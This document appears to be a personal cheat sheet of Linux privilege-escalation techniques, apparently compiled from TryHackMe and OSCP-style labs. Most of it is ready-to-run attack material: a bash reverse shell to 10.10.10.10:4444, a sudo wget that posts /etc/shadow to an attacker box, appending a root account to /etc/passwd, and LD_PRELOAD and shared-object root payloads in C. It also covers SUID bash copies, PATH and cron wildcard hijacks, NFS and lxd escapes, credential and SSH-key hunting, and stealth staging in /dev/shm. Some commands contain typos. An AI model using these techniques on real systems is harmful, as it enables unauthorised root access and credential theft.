# Linux Privilege Escalation 

For [[Core-Linux-Commands]]
For [[Grep-All-The-Things]]
For [[Linux-Module-Commands]]
For [[Linux-Networking-Commands]]
For [[Important-Linux-Locations]]

## Got on the box, have a look

Privilege Escalation commonly without binary exploitation focuses on misconfigurations surrounding access control.

- RTFM, Ready the binaries to drop - check the 32bit or 64bit!
- Rely on knowing how it should be configured - do not rely one or two enumeration scripts for this specific task  
- Don't be lazy but not be stupid, scripts that try to exploit are no good for some Certifications, but they are also good..
- Marshalling data to a directory with permission control in Linux means cp to your controlled directory has parent directory permission under user context.
- `/dev/shm` is share memory and so [[Linux-File-Transfers]] to this directory be more evasive. Check `mount` if is has `no exec`.
- `strance` are system calls: lots of info use `ltrace` for library calls, less junk information, easier to read.

Linux PrivEsc is the Power of `R` `W` `X`) -
`TOOL  (--help,RTFM) -> input -> [CONTEXT] -> (how the below then get you root/privesc)`
- Can binary/script read a file if so how
- can binary/script write if so how
- Cand binary/script execute if so how

Linpeas is Exam friendly now, [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) see [[LinEnum-Helpsheet]], [lse](https://github.com/diego-treitos/linux-smart-enumeration)

Reduce cleanup and human error plus increase stealth with marshalling data in onee word writable directory 
```bash
/tmp # is good 
/dev/shm # is better
# /dev/shm may have noexec flag requires:
mount | grep shm
```

## Lay of the land enumeration:

You may end up in a docker container consider: [[Docker-Hacking]]. If it is not docker then you may need to escape a Kuberenetes cluster; for more detailed information about Kubernetes or Hacking Kuberenetes see [[Kubernetes]] and [[Kubernetes-Hacking]]
```bash
id                      # user and usergroup info
ls -la /                # never use ls check for .dockerenv - ls -la for permission
getfacl $directory/file # Special permissions like: drwxr-x---+  
uname -a                # get system info # search for kernel exploits as last resort
uname -ar  
cat /etc/issue  
cat /etc/*-release  
cat /etc/lsb-release      # Debian based  
cat /etc/redhat-release   # Redhat based
cat /etc/fstab			# File system table
/bin/lsblk				# view all avaliable disks
sudo -V                 # version
sudo id                 # get id of sudo
visudo                  # sudo policy file
ps 1                    # Systemd or SysV init
ps aux                  # All processes, find weird processes run by root or horizonatals
ps ajxf                 # Process tree
env                     # Show environment variables
file /sbin/init         # Is asymbolic link to /lib/systemd/systemd OR..
history                 # Command history
ifconfig                # Legacy Network interfaces
ip a					# Network interfaces
ip route                # Network route, check route or routel
ss -a              # All listening port and connections
ss -at -au         # All TCP or UDP connections
ss -l              # All listening ports
ss -s              # Statistics
netstat -tp             # PID information (Netstat is legacy!)
netstat -anlp           # Network services running interally
netstat -ano
apt list --upgradeable  # Software installed and versioning
which python3 && which python && which nc; # list of stuff to use
```

## Network Architecture

```bash
cat /proc/net/arp
```

## Patch Level
```bash
lsmod
dpgk -l # debian
rpm -qa # CentOS, OpenSuse, Fedora, RHEL
pkg_info # OpenBSD FreeBSD
/sbin/modinfo libata
```

## Files and artifacts of interest

[[Important-Linux-Locations]]

## Passwords or shiny things?
```bash
# Webshell in?
# Check per subdomain for data handling
# Find where it communicates with any databases 
find . -type d -name *onf* 2>/dev/null
find . -type f -name *onf* 2>/dev/null
# PHP function that lead to passwords
grep -r -e require_once

# Find and Xargs and grep all configuration files
find . -type f -name "*.*onf*" 2>/dev/null | xargs grep -ie 'passw'
find . -type f -name config* 2>/dev/null | 
find . -type d -name *onf* 2>/dev/null | ls | xargs grep -rie 'passw'
find / -type f -name "*.log" 2>/dev/null
find . -type f 2>/dev/null             # for those id_rsas @rennox 
find . -type f -perm /o=r -print0 | xargs -0 grep -l password=

grep -r -e '.conf\|config*'


cat /home/<user>/myvpn.ovpn
cat /etc/openvpn/auth.txt
cat /home/<user>/.irssi/config | grep -i passw
cat ~/.bash_history | grep -i passw
## Found any?
/var/log
/var/log/auth.log
/var/spool/mail

cat * | grep -i passw*
cat /etc/passwd                        # displays all users
cat /etc/passwd | grep home            # show all real users!
cat /etc/shells                        # displays all shells
cat /etc/crontab                       # displays all cronjobs
cat /etc/hosts
cat /etc/resolv.conf
ls -la ~/.*history                     # All the history files in a directory
cat ~/.*history | less                 # view all them
cat /proc/cpuinfo                      # duh, but also nproc show number of cpus
cat /proc/version                      # for kernel version
cat /etc/issue
cat /etc/exports                       # Check for no_squash_root on writable shares 
## Stored Creds in cat-able config, history, txt files
cat /../*.*vnp
cat ~/.bash_history | grep -i passw
```

Create passwords
```bash
mkpasswd -m sha-512 Password1234
```

## World writable files and directories to check

Interesting files of a User
```bash
find / -user $USER -ls 2>/dev/null | grep -v '/run/\|/proc/\|/sys/'
```

Always check permissions custom scripts deeper binaries and scripts that are used.
```bash
ls -la /etc/hosts; ls -la /etc/crontab; ls -la /etc/shadow; ls -la /shadow.bak 
find / -writable -type d 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

chown -R $user:$user /$path # recursive chown if in need to pwn 
chmod 7777 $privEscFile # set sticky bit, suid, guid  

pythonscript.py -i # interactive python in security context
```

Touch or edit some file with for shell; don't forget Language, file extensions, shared binaries or libraries  
This just a placeholder example:  
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Weak file permission on password system

```bash
cat /etc/passwd | cut -d: -f1 | awk -F: '($3 == "0") {print}' /etc/passwd
ls -la /etc/shadow | cat /etc/shadow
# For /etc/passwd use one of the below
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
# Then
echo 'hacker:$GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash' >>/etc/passwd
```
NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.

## Weak sensitive files permissions

Beware these can break some shells
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

#### User-key related
Create a password hash that is compliant use ssh-keygen, generate a ssh key, store in /root/.ssh
```bash
openssl passwd -1 -salt [salt] [password]
chmod 600 $key
ssh -i id_rsa root@ip                      
```
Find those keys!
```bash
find / -name authorized_keys 2>/dev/null ## Find ssh keys
find / -name id_rsa 2>/dev/null
```
copy keys  
```bash
chmod 400 id_rsa
ssh -i _id_rsa [id]@[ip]
```

## Path misconfiguration

```bash
. # if you do not have to write ./bin
# You will be able to execute any script or binary that is in the current directory
./. # is how it should be configured

$PATH # It you can write inside some directory the $PATH create a backdoor there that is name of a command by escalation target
```

Usually `$PATH` should be order similar to: `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin`

#### Path injection

```bash
echo $PATH 
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

Make file identical to command, containing 'bash -p', chmoding, export PATH and then run vulnerable file
```bash
mkdir badapple; echo 'bash -p' > badapple/cp
chmod +x badapple/cp
export PATH="/dev/shm/badapple/:$PATH"
./runvulnbin
# If sudo is involved
```

## Sudo 

```bash
sudo -l # check usage
sudo /usr/bin/wget --post-file=/etc/shadow http//attackbox:port # Sudo -l but no password NO problem!
```

If a script or code is writable requires sudo permissions to execute:
```bash
# Copy a new bash
cp /bin/bash /tmp/shell
# Add to script/code
chown root:root; chmod 4755 /tmp/shell
# Escalate
./shell -p
# If you can path hijack a binary from $vuln script provide a path
sudo PATH=/dev/shm:$PATH $vulnScript
# sudo -u to abuse file permission to call sudo through unsafe variable input, handling
sudo -u username unsafefileofusername # somehow pass /bin/bash as paramtres
```

Shell escaping, abusing intended functionality - **Check** [GTFOBins](https://gtfobins.github.io/)
```bash
sudo apache2 -f /etc/shadow
```

## Sudo LD_PRELOAD  

#### if LD_PRELOAD appears in output
create .c -> compile  
gcc ```gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles); ```  
This:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

This set the LD_PRELOAD to the path of a shared object, which will be loaded before any other library (including C runtime, libc.so  
```
sudo LD_PRELOAD=/tmp/x.so [/some/bin/or/prog]
```
Tiberius Room versions/additions: 

Careful `-nostartfiles` Do not use the standard system startup files when linking.
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c 
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Also
```bash
ldd /usr/sbin/apache2 # find shared libraries
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
````


## SUID/SGID

#### Find suid/sgid bins
Exploit-DB, Google, and GitHub. GTFOBINs  are your friends.
SUID, SGID permission files run in the context of owner
bash drop ssuid permissions, but dash does not drop suid permissions

SUID (Set-user Identification) and SGID (Set-group Identification), look for "s" set
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
find / -type f -perm -u=s -exec -ls -ldb {} \; 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -04000 -o -2000 2>/dev/null
-4000 # for suid
-2000 # for sgid
```

#### SUID Environment Variables

First find vulnerable binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
**REQUIRES STRINGS!!**  consider encodings `-e` 
```bash
strings ../bin/<suid-env> # consider the function calls in the strings output
```
Injectable suidlib.c or some other function somewhere else in the file system?
Inject a path to renamed "escalation.c" to required by the binary *.c
```bash
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c #escalation->service.c
gcc /tmp/service.c -o /tmp/service # compile with naming to match target 
export PATH=/tmp:$:PATH # inject a path 
/usr/local/bin/<suid-env>
```
Dodgy services in the strings output
Method #1
> Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path. 

function /usr/sbin/service() { 
```bash
cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
export -f /usr/sbin/service
```  
Method #2  
ONLY Bash versions <= 4.3!!  
> When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements  
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

## Shared Object Injection

First output all SUID binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
````
List packages -> version enumeration!
```bash
dpkg -l | grep #for the package
```
Run strace to check if there missing binaries
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
Impersonate directory and file to replace missing SUID: mkdir /home/user/.confid | cd /home/user/.config
```c
#include <stdio.h>
#include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject() {
                system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
        }

```
Save libcalc.c 
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```

## SUID (symlinks)

Commence [[Search-Engine-Dorking]]   
```bash
dpkg -l | grep <program>
```

## Capabilities

Check the capabilities
```bash
getcap -r / 2>/dev/null
```

Find `setcap` with sticky bit permissions
```bash
# Find setcap here
find / -type f -perm -04000 -ls 2>/dev/null
# Ver the capabilities on a linux system
getcap -r / 2>/dev/null
# copy a binary we control without changing the original 
cp /usr/bin/python3 /tmp/python3 # or /dev/shm 
# give this binary the capabilites to setuid
setcap cap_setuid+ep python3
/usr/bin/python[ver] -c 'import os; os.setuid(0);os.system("/bin/bash")'
```

## Unmounted Filesystems

```bash
mount -l
cat /etc/fstab # beware output length 
```


## Cron related 

```bash
cat /etc/crontab
ls -la [anyfiles] for permissions
cat [anyfiles] for wildcards in scripting
crontab -l # per-user user crontab!
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### Cron Path

PATH variable of files
```bash
echo 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash' > /home/user/privescCron
chmod +x /home/user/privescCron
/tmp/bash -p
```

#### Cron Wildcards

Either 1. use native binaries OR 2. msfvenom reverse shell
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/privescCron # Only 1st
touch /home/user/--checkpoint=1 # BOTH require this
touch /home/user/--checkpoint-action=exec=sh\ runme.sh #..=exec=shell.elf
/tmp/bash -p # Only 1st
```

#### Cron File Permissions 

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/privescCron
/tmp/bash -p
```

## Services

Find services running as root ath are exploitable if no password is set!
```bash
ps -aux | grep root
```

## NFS root squshing - found ls -la /etc/exports ?

Find a " no_root_squash "
```bash
# From Host
showmount -e $remoteIP
mkdir /mnt/nameofmount
# 
mount -o rw,vers=2 $remoteIP:/$ExportedLocation /tmp/nameofmount  # -nolock
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/nameofmount/x.c
gcc /tmp/nameofmount/x.c -o /tmp/nameofmount/x
chmod +s /tmp/nameofmount/x
# Target
/nameofmount/x
```

## Find lxd and lxc?

Enumerate and file transfer an image
```bash
lxd version
lxc image list
# Check if user is in lxc/lxd groups
cat /etc/group | grep $USER
```
[Hacktricks lxd privesc due to group article](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
Similarly without bulding the image and using a image on the box:
 1. import image 
 2. 2. run image 
 3. 3. /mnt into box itself 
 4. 4. start container and run sh
```bash
lxc image import ./alpine*.tar.gz --alias $myimage
lxc init $myimage $mycontainer -c security.privileged=true
lxc config device add $mycontainer  mydevice disk source=/ path=/mnt/root recursive=true
xc start $mycontainerkernel
lxc exec $mycontainer /bin/sh
cd /mnt/INTO/INTOAGAIN # Metaphorical PrivEsc method of a portal gun and pirate ship boarding. :)
```


## Ansible

Find a writeble playbook or be able to run a bad playbook for some bad Ansible with [shell module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html)
```yaml
# $USER must be specifed
- name: Bad bash
  ansible.builtin.shell: "cp /bin/bash /home/$USER/bash; chmod u+s /home/$USER/bash"
```


## Kernel Exploits

Enumerate Linux Distro flavor OS and the Kernel version. Match the compiler with the architecture of our target.
```bash
uname -a
arch
cat /etc/issue
# Searchsploit o'clock!
```

## RC Misconfigurations

```bash
# .bashrc weirdness
# disabling a bash builtin may lead to path injection
enable -n $Builtin
# As pathing to the builtin that is a file is then controllable:
export PATH=/dev/shm:$PATH
/dev/shm/[
```

## References

[linprivesc](https://tryhackme.com/room/linprivesc)
[linuxprivesc](https://tryhackme.com/room/linuxprivesc) # Sagi Shahar/Tib3rius room
[linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)
[commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc)
[lpeworkshop](https://github.com/sagishahar/lpeworkshop)
[netbiosX](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
[sushant747](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
[payatu](https://payatu.com/guide-linux-privilege-escalation)
[Wild west hackin' Fest Jake Williams - Talk: Privilege Escalation](https://www.youtube.com/watch?v=yXe4X-AIbps)
[Udemy - tib3rius](https://www.udemy.com/user/tib3rius/)
[Hacking Articles linux-privilege-escalation-using-capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
[Ansible shell module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html)